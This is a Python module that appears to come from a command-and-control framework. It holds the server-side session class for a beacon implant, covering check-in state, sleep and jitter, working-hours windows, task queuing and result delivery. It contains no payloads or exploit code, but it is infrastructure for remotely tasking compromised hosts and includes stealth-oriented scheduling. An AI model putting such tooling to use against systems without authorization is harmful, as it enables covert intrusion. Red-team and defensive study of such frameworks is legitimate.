"""Server-side representation of one beacon implant.

A beacon has no persistent socket. Its entire state is derived from
incoming HTTP requests. This class captures that state and gives the
engine a place to accumulate queued work and pending results.

All reads are lock-free. Writes to the `pending` map go through
`_pending_lock`; everything else is mutated by BeaconEngine under the
engine lock.
"""

from __future__ import annotations

import queue
import threading
import time
from typing import Dict, List, Optional

from . import constants
from .protocol import Result, Task, new_task_id


class PendingTask:
    """Blocking handle for a task that has been queued but not returned."""

    def __init__(self, task_id: str):
        self.task_id = task_id
        self._event = threading.Event()
        self._result: Optional[Result] = None

    def set(self, result: Result) -> None:
        self._result = result
        self._event.set()

    def wait(self, timeout: float) -> Optional[Result]:
        self._event.wait(timeout=timeout)
        return self._result


class BeaconSession:
    """One logical beacon session."""

    def __init__(self, session_id: int, identity: dict, fingerprint: str):
        self.id = session_id
        self.name: Optional[str] = None
        self.identity: dict = dict(identity)
        self.fingerprint = fingerprint

        # Network state, refreshed on every check-in.
        self.last_addr: Optional[str] = None
        self.last_seen: float = time.time()
        self.first_seen: float = self.last_seen

        # Scheduling parameters, negotiated on check-in.
        self.sleep_interval: int = constants.DEFAULT_SLEEP
        self.jitter: float = constants.DEFAULT_JITTER
        self.kill_deadline: float = 0.0

        # Working-hours window as minutes since midnight. Mirrors the
        # agent-side WorkHoursStart / WorkHoursEnd. Set from the
        # operator console; pushed to the agent on every /tasks poll.
        #
        #   start == end  → disabled (beacon runs 24/7)
        #   start <  end  → normal window
        #   start >  end  → wrapped window (e.g. 22:00–06:00)
        #
        # These are populated from the agent's build-time values when
        # the check-in identity carries them. The server's own default
        # is only used for agents built before the identity fields
        # existed. Without this precedence, the very first /tasks poll
        # would push the server's 08:00-19:00 back to an agent that
        # was built with --work-off, and the agent would silently enter
        # off-hours polling.
        self.work_hours_start: int = 480    # 08:00
        self.work_hours_end:   int = 1140   # 19:00
        _ws = identity.get('work_start')
        _we = identity.get('work_end')
        if _ws is not None and _we is not None:
            try:
                _wsi = int(_ws)
                _wei = int(_we)
                if 0 <= _wsi < 1440 and 0 <= _wei < 1440:
                    self.work_hours_start = _wsi
                    self.work_hours_end   = _wei
            except (TypeError, ValueError):
                pass

        # Task machinery.
        self.task_queue: queue.Queue = queue.Queue(
            maxsize=constants.TASK_QUEUE_LIMIT)
        self.pending: Dict[str, PendingTask] = {}
        self.results: List[Result] = []
        self._pending_lock = threading.Lock()

        # Results that have arrived but not yet been printed to the
        # operator. The console drains this before every prompt and
        # after every dispatch, so results appear as soon as they
        # land without blocking the operator.
        #
        # Bounded so a long engagement where the operator never checks
        # in cannot grow the queue without limit. Entries over the cap
        # are dropped (with a note in session.log).
        self.unread_results: queue.Queue = queue.Queue(maxsize=256)

        # Bookkeeping.
        self.checkins: int = 0
        self.rejected_results: int = 0
        self.logger = None
        self.tags: List[str] = []

        # Session cookie issued at check-in and expected on every
        # subsequent request. Format: "<base64url(16 random bytes)>.
        # <base64url(hmac-sha256(random))>". The random component
        # makes enumeration infeasible; the HMAC proves the server
        # issued the cookie and prevents an attacker who observed one
        # request from forging a different session's cookie.
        self.cookie: Optional[str] = None


        # Agent's ECDSA public key, pinned at first check-in. Used to
        # verify every subsequent result. If the agent reconnects with
        # a different key, the engine rejects it (impersonation guard).
        self.agent_pubkey = None

    # ------------------------------------------------------------------
    # Session state

    @property
    def alive(self) -> bool:
        """Beacon is alive if it has checked in recently.

        A beacon whose sleep interval is N seconds is declared dead
        after BEACON_TTL_FACTOR * N seconds of silence.

        The grace window uses the *maximum* of the currently-configured
        interval and the interval the agent last confirmed it was
        using. Without this, setting `sleep 0` from the console would
        immediately drop the grace from 240s to 60s and the session
        would flash "dead" while the agent was still finishing its
        previous 60s cycle. The agent's next poll updates
        `_confirmed_sleep` and the window narrows correctly.
        """
        confirmed = getattr(self, '_confirmed_sleep', self.sleep_interval)
        effective = max(self.sleep_interval, confirmed)
        grace = max(effective * constants.BEACON_TTL_FACTOR, 60)
        return (time.time() - self.last_seen) < grace

    @property
    def display_name(self) -> str:
        if self.name:
            return self.name
        user = self.identity.get('username', '?')
        host = self.identity.get('hostname', '?')
        return f"{user}@{host}"

    @property
    def age(self) -> int:
        return int(time.time() - self.last_seen)

    # ------------------------------------------------------------------
    # Task submission

    def enqueue(self, verb: str, args: Optional[List[str]] = None,
                timeout: int = 60, sign=None) -> Optional[str]:
        """Queue a task and register a result waiter.

        Returns the task id, or None if the queue is full. Never
        blocks — the console thread is the caller, and a beacon on a
        long sleep with a chatty operator would otherwise freeze the
        whole handler until the next check-in drained the backlog.

        `sign`, if provided, is called with the task's `unsigned()`
        dict before the task enters the queue. Its return value is
        stored on `task.signature`. Signing must happen before the
        queue put: once the task is visible to the listener it may
        already be on the wire.
        """
        task = Task(id=new_task_id(), verb=verb,
                    args=args or [], timeout=timeout)
        if sign is not None:
            try:
                task.signature = sign(task.unsigned()) or ''
            except Exception:
                task.signature = ''
        # Register the waiter BEFORE publishing the task. Otherwise a
        # fast /tasks poll can ship the task and the result can come
        # back before `pending[task.id]` exists — the result is then
        # appended to history but never delivered to the waiter.
        waiter = PendingTask(task.id)
        with self._pending_lock:
            self.pending[task.id] = waiter
        try:
            self.task_queue.put_nowait(task)
        except queue.Full:
            with self._pending_lock:
                self.pending.pop(task.id, None)
            return None
        # Return both so the caller holds a reference to the waiter
        # before the result can pop it from `pending`. Without this
        # the console's `session.pending.get(task_id)` races a fast
        # beacon and gets None.
        return task.id, waiter

    def pop_task(self) -> Optional[Task]:
        """Called by the listener when the beacon requests work."""
        try:
            return self.task_queue.get_nowait()
        except queue.Empty:
            return None

    def pending_count(self) -> int:
        with self._pending_lock:
            return len(self.pending)

    def list_pending(self) -> List[str]:
        """Return the IDs of tasks that have been queued but not yet
        returned. Safe to call from any thread; the caller gets a
        snapshot that cannot change under it."""
        with self._pending_lock:
            return list(self.pending.keys())

    # ------------------------------------------------------------------
    # Result delivery

    def deliver_result(self, result: Result) -> None:
        """Called by the listener when the beacon posts a result."""
        with self._pending_lock:
            waiter = self.pending.pop(result.id, None)
            # History mutation also runs under the lock. During
            # batched uploads two POSTs to /results can arrive close
            # enough that concurrent appends would race on the slice.
            self.results.append(result)
            if len(self.results) > constants.TASK_HISTORY_LIMIT:
                self.results = self.results[
                    -constants.TASK_HISTORY_LIMIT // 2:
                ]
        # Signal the waiter after releasing the lock, so a slow
        # waiting thread cannot stall the listener thread.
        if waiter is not None:
            waiter.set(result)

    def await_result(self, task_id: str,
                     timeout: float = constants.TASK_TIMEOUT) -> Optional[Result]:
        """Block until the beacon posts the result, or the timeout expires."""
        with self._pending_lock:
            waiter = self.pending.get(task_id)
        if waiter is None:
            return None
        return waiter.wait(timeout=timeout)